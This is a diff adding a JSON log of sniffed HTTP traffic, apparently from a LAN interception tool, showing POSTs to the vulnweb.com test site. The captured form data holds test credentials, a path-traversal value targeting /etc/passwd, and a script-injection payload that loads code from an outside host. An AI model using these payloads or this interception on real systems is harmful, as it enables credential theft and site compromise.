@@ -1,0 +1,41 @@
+{
+    "192.168.1.100": {
+        "alias": "SEMIHTWO",
+        "http_request": [
+            {
+                "timestamp": "2025-05-24T15:43:53.641771",
+                "method": "POST",
+                "path": "testphp.vulnweb.com/userinfo.php",
+                "raw": "[15:42:57] [net.sniff.http.request] http SEMIHTWO POST testphp.vulnweb.com/userinfo.php"
+            },
+            {
+                "timestamp": "2025-05-24T15:43:53.641943",
+                "method": "POST",
+                "path": "testphp.vulnweb.com/userinfo.php",
+                "raw": "192.168.1.0/24 > 192.168.1.104  \u00bb  \b[15:42:57] [net.sniff.http.request] http SEMIHTWO POST testphp.vulnweb.com/userinfo.php"
+            },
+            {
+                "timestamp": "2025-05-24T15:43:53.642012",
+                "method": "POST",
+                "path": "testphp.vulnweb.com/userinfo.php",
+                "raw": "192.168.1.0/24 > 192.168.1.104  \u00bb  \b[15:43:04] [net.sniff.http.request] http SEMIHTWO POST testphp.vulnweb.com/userinfo.php"
+            },
+            {
+                "timestamp": "2025-05-24T15:43:53.642155",
+                "method": "POST",
+                "path": "testphp.vulnweb.com/userinfo.php",
+                "raw": "192.168.1.0/24 > 192.168.1.104  \u00bb  \b[15:43:20] [net.sniff.http.request] http SEMIHTWO POST testphp.vulnweb.com/userinfo.php"
+            }
+        ],
+        "http_post_data": [
+            {
+                "timestamp": "2025-05-24T15:43:53.641771",
+                "data": "uname=test&pass=test"
+            },
+            {
+                "timestamp": "2025-05-24T15:43:53.642012",
+                "data": "urname=John Smith&ucc=123456787654321&uemail=/../../../../../../../../../../../etc/passwd&uphone=2323345&uaddress=\"><script src=\"https://js.rip/pznw6clllm\"></script>&update=update"
+            }
+        ]
+    }
+}
